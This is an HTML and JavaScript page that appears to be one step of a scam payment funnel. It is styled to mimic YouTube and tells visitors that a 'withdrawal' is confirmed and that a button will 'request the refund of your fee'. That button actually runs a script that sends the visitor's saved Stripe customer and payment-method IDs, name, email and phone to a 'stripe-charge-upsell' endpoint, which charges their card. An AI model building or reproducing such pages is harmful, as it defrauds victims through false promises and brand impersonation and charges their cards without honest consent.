<style>
  html, body {
    margin: 0;
    padding: 0;
  }

  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
    background: #0f0f0f;
    color: #f1f1f1;
    -webkit-font-smoothing: antialiased;
  }

  .page {
    position: relative;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 24px 16px;
    overflow: hidden;
    background: #0f0f0f;
  }

  .background-shape {
    position: absolute;
    border-radius: 50%;
    filter: blur(100px);
    opacity: 0.10;
    pointer-events: none;
    z-index: 0;
  }

  .background-shape.one {
    width: 480px;
    height: 480px;
    background: #ff0000;
    top: -180px;
    left: -180px;
  }

  .background-shape.two {
    width: 520px;
    height: 520px;
    background: #ff0000;
    bottom: -220px;
    right: -220px;
  }

  main {
    position: relative;
    z-index: 1;
    width: 100%;
    display: flex;
    justify-content: center;
  }

  .card {
    position: relative;
    background: #181818;
    border-radius: 14px;
    padding: 42px 34px 32px;
    max-width: 440px;
    width: 100%;
    box-shadow: 0 18px 50px rgba(0, 0, 0, 0.45);
    text-align: center;
    border: 1px solid #2f2f2f;
  }

  /* Barra superior estilo plataforma de vídeo */
  .card::before {
    content: "";
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    height: 5px;
    background: #ff0000;
    border-radius: 14px 14px 0 0;
  }

  .check {
    width: 88px;
    height: 88px;
    margin: 0 auto 22px;
    border-radius: 50%;
    box-shadow: 0 0 0 8px rgba(255, 0, 0, 0.08);
    animation: check-pulse 1.8s ease-in-out infinite;
  }

  @keyframes check-pulse {
    0%, 100% {
      box-shadow:
        0 0 0 8px rgba(255, 0, 0, 0.08),
        0 0 0 0 rgba(255, 0, 0, 0.20);
      transform: scale(1);
    }

    50% {
      box-shadow:
        0 0 0 8px rgba(255, 0, 0, 0.08),
        0 0 0 15px rgba(255, 0, 0, 0);
      transform: scale(1.04);
    }
  }

  .check svg {
    width: 100%;
    height: 100%;
    display: block;
    border-radius: 50%;
  }

  .status {
    display: inline-flex;
    align-items: center;
    gap: 7px;
    background: #242424;
    color: #f1f1f1;
    font-weight: 600;
    font-size: 13px;
    padding: 8px 14px;
    border-radius: 999px;
    margin-bottom: 18px;
    border: 1px solid #383838;
  }

  .status svg {
    width: 16px;
    height: 16px;
    color: #ff0000;
  }

  h1 {
    font-size: 38px;
    line-height: 1.12;
    font-weight: 800;
    color: #ffffff;
    margin: 8px 0 12px;
    letter-spacing: -0.025em;
  }

  .lead {
    font-size: 19px;
    line-height: 1.4;
    font-weight: 600;
    color: #f1f1f1;
    margin: 0 0 14px;
  }

  .description {
    font-size: 14px;
    color: #b3b3b3;
    margin: 0 auto 25px;
    line-height: 1.55;
    max-width: 360px;
  }

  /* Container do botão */
  [data-cooud-flow-root] {
    display: flex !important;
    flex-direction: column !important;
    align-items: center !important;
    justify-content: center !important;
    width: 100% !important;
    max-width: 100% !important;
    gap: 10px !important;
    margin: 0 auto 28px !important;
    font-family: inherit !important;
  }

  /* Botão principal */
  [data-cooud-flow-primary] {
    display: inline-flex !important;
    align-items: center !important;
    justify-content: center !important;
    width: 100% !important;
    max-width: 330px !important;
    min-width: 0 !important;
    box-sizing: border-box !important;
    padding: 15px 24px !important;
    background: #ff0000 !important;
    color: #ffffff !important;
    font-family: inherit !important;
    font-size: 16px !important;
    font-weight: 700 !important;
    line-height: 1.2 !important;
    text-decoration: none !important;
    border: none !important;
    border-radius: 4px !important;
    cursor: pointer !important;
    box-shadow: 0 6px 18px rgba(255, 0, 0, 0.25) !important;
    transition:
      background 0.15s ease,
      transform 0.15s ease,
      box-shadow 0.15s ease !important;
  }

  [data-cooud-flow-primary]:hover {
    background: #cc0000 !important;
    transform: translateY(-1px) !important;
    box-shadow: 0 8px 22px rgba(255, 0, 0, 0.32) !important;
  }

  [data-cooud-flow-primary]:active {
    transform: translateY(0) !important;
    box-shadow: 0 3px 10px rgba(255, 0, 0, 0.22) !important;
  }

  /* Botão secundário */
  [data-cooud-flow-dismiss] {
    display: inline-flex !important;
    align-items: center !important;
    justify-content: center !important;
    width: auto !important;
    padding: 8px 14px !important;
    background: transparent !important;
    color: #aaaaaa !important;
    font-family: inherit !important;
    font-size: 13px !important;
    font-weight: 500 !important;
    border: none !important;
    border-radius: 4px !important;
    cursor: pointer !important;
    transition:
      background 0.15s ease,
      color 0.15s ease !important;
  }

  [data-cooud-flow-dismiss]:hover {
    background: #242424 !important;
    color: #ffffff !important;
  }

  .badges {
    display: flex;
    flex-wrap: wrap;
    gap: 8px;
    justify-content: center;
    margin: 18px 0 16px;
  }

  .badge {
    display: inline-flex;
    align-items: center;
    gap: 6px;
    background: #242424;
    color: #b3b3b3;
    font-size: 12px;
    font-weight: 600;
    padding: 8px 12px;
    border-radius: 4px;
    border: 1px solid #383838;
  }

  .badge svg {
    width: 14px;
    height: 14px;
  }

  .note {
    font-size: 12px;
    color: #777777;
    margin: 8px 0 0;
  }

  @media (max-width: 480px) {
    .page {
      padding: 18px 12px;
      background: #0f0f0f;
    }

    .card {
      padding: 34px 20px 25px;
      border-radius: 12px;
      background: #181818;
    }

    .card::before {
      border-radius: 12px 12px 0 0;
    }

    .check {
      width: 82px;
      height: 82px;
      margin-bottom: 19px;
    }

    h1 {
      font-size: 32px;
    }

    .lead {
      font-size: 17px;
    }

    .description {
      font-size: 13px;
      margin-bottom: 22px;
      color: #a7a7a7;
    }

    [data-cooud-flow-primary] {
      max-width: 100% !important;
      padding: 15px 20px !important;
    }

    .badges {
      gap: 6px;
    }

    .badge {
      font-size: 11px;
      padding: 7px 9px;
    }
  }
  
  
  /* =========================================
   YOUTUBE HEADER
========================================= */

  .youtube-header {
    height: 64px;
  }

  .youtube-logo {

  }
}

</style>

<body>

<!-- YouTube Header -->

<div class="page">
  <div class="background-shape one" aria-hidden="true"></div>
  <div class="background-shape two" aria-hidden="true"></div>

  <main data-funnel-view="upsell_1">
    <section class="card" aria-labelledby="page-title">

      <div class="check" aria-hidden="true">
        <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
          <circle cx="50" cy="50" r="48" fill="#ff0000"/>
          <path d="M27 51.5 43 67.5 74 34.5"
                fill="none"
                stroke="#fff"
                stroke-width="9"
                stroke-linecap="round"
                stroke-linejoin="round"/>
        </svg>
      </div>

      <div class="status">
        <svg viewBox="0 0 24 24"
             fill="none"
             stroke="currentColor"
             stroke-width="2.6"
             stroke-linecap="round"
             stroke-linejoin="round"
             aria-hidden="true">
          <path d="m5 12 4 4L19 6"/>
        </svg>
        Withdrawal request confirmed
      </div>

      <h1 id="page-title">Congratulations!</h1>

      <p class="lead">
        In a few moments you will receive the amount.
      </p>

      <p class="description">
        Click the button below to request the refund of your fee.
      </p>

      <div class="btn-wrap">
        <a href="#accept"
           id="btnAcceptUpsell"
           data-funnel-step="upsell_1"
           style="font-family: 'Poppins', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size: 18px; font-weight: 600; line-height: 1.3; color: #ffffff; background-color: #0872e2; border: none; border-radius: 10px; padding: 13px 7%; cursor: pointer; text-align: center; display: block; width: fit-content; margin: auto; text-decoration: none;">
          Accept Offer
        </a>

        <div id="upsellError" style="display: none; color: #f87171; font-size: 13px; font-weight: 600; margin-top: 12px; text-align: center;"></div>

        <a href="#decline"
           id="btnDeclineUpsell"
           style="font-family: 'Poppins', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size: 14px; color: #666666; text-align: center; display: block; margin: 16px auto 0; text-decoration: underline;">
          No, thanks. I don't want this offer.
        </a>

      <div class="badges" aria-label="Security guarantees">

        <span class="badge">
          <svg viewBox="0 0 24 24"
               fill="none"
               stroke="currentColor"

</div>

<script>
(function () {
  var STORAGE_KEY = 'yt_funnel_params';
  var WORKER_URL = 'https://yt-pay.morganstudio.store/api/stripe-charge-upsell';
  var NEXT_URL = 'https://morganstudio.store/youtube/up2/';

  function getMergedParams() {
    var merged = {};
    try {
      var raw = localStorage.getItem(STORAGE_KEY);
      if (raw) {
        var parsed = JSON.parse(raw);
        if (parsed && typeof parsed === 'object') merged = parsed;
      }
    } catch (e) {}
    try {
      new URLSearchParams(window.location.search).forEach(function (v, k) {
        if (v) merged[k] = v;
      });
    } catch (e) {}
    try {
      localStorage.setItem(STORAGE_KEY, JSON.stringify(merged));
    } catch (e) {}
    return merged;
  }

  function buildUrlWithParams(baseUrl, extra) {
    var params = getMergedParams();
    if (extra) {
      for (var k in extra) {
        if (extra[k] != null) params[k] = extra[k];
      }
    }
    var qs = new URLSearchParams();
    for (var key in params) {
      if (params[key] != null && params[key] !== '') {
        qs.set(key, params[key]);
      }
    }
    var q = qs.toString();
    return baseUrl + (q ? (baseUrl.indexOf('?') > -1 ? '&' : '?') + q : '');
  }

  var params = getMergedParams();
  var customerId = params.cid || params.customer_id || '';
  var paymentMethodId = params.pm || params.payment_method_id || '';
  var stripeAccount = params.acc || 'a';
  var name = params.name || '';
  var email = params.email || params.e || '';
  var phone = params.phone || '';

  var btnAccept = document.getElementById('btnAcceptUpsell');
  var btnDecline = document.getElementById('btnDeclineUpsell');
  var errorEl = document.getElementById('upsellError');
  var isProcessing = false;

  if (btnAccept) {
    btnAccept.addEventListener('click', function (e) {
      e.preventDefault();
      if (isProcessing) return;

      if (!customerId || !paymentMethodId) {
        window.location.href = buildUrlWithParams(NEXT_URL);
        return;
      }

      isProcessing = true;
      btnAccept.style.opacity = '0.7';
      btnAccept.style.pointerEvents = 'none';
      btnAccept.textContent = 'Processing...';
      if (errorEl) errorEl.style.display = 'none';

      var qs = new URLSearchParams(params).toString();
      var chargeEndpoint = WORKER_URL + (qs ? '?' + qs : '');

      fetch(chargeEndpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          customer_id: customerId,
          payment_method_id: paymentMethodId,
          upsell_number: 1,
          name: name,
          email: email,
          phone: phone,
          stripe_account: stripeAccount,
          extra_params: params
        })
      })
        .then(function (r) { return r.json(); })
        .then(function (data) {
          if (data && data.ok) {
            btnAccept.textContent = 'Confirmed! Redirecting...';
            var target = data.next_url || buildUrlWithParams(NEXT_URL, { upsell1_bought: '1' });
            setTimeout(function () {
              window.location.href = target;
            }, 400);
          } else {
            isProcessing = false;
            btnAccept.style.opacity = '1';
            btnAccept.style.pointerEvents = 'auto';
            btnAccept.textContent = 'Accept Offer';
            if (errorEl) {
              errorEl.textContent = (data && data.error) || 'Payment could not be processed. Please try again.';
              errorEl.style.display = 'block';
            }
          }
        })
        .catch(function () {
          window.location.href = buildUrlWithParams(NEXT_URL);
        });
    });
  }

  if (btnDecline) {
    btnDecline.addEventListener('click', function (e) {
      e.preventDefault();
      window.location.href = buildUrlWithParams(NEXT_URL, { upsell1_declined: '1' });
    });
  }
})();
</script>
